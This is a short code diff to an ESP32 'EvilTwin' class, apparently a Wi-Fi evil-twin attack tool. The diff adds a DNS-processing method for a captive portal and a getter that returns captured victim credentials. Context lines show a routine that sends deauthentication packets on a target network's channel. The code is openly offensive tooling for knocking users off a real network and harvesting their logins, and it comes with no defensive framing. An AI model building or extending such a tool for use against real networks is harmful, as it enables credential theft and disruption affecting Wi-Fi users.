@@ -123,6 +123,11 @@ void EvilTwin::loop() {
     }
 }
 
+// <-- ADD THIS IMPLEMENTATION
+void EvilTwin::processDns() {
+    dnsServer_.processNextRequest();
+}
+
 void EvilTwin::deauthRoutine() {
     esp_wifi_set_channel(targetNetwork_.channel, WIFI_SECOND_CHAN_NONE);
     uint8_t deauth_packet[sizeof(deauth_frame_template)];
@@ -233,3 +238,4 @@ bool EvilTwin::isActive() const { return isActive_; }
 bool EvilTwin::isAttackPending() const { return isAttackPending_; }
 const WifiNetworkInfo& EvilTwin::getTargetNetwork() const { return targetNetwork_; }
 int EvilTwin::getVictimCount() const { return capturedCredentials_.size(); }
+const std::vector<VictimCredentials>& EvilTwin::getCapturedCredentials() const { return capturedCredentials_; }
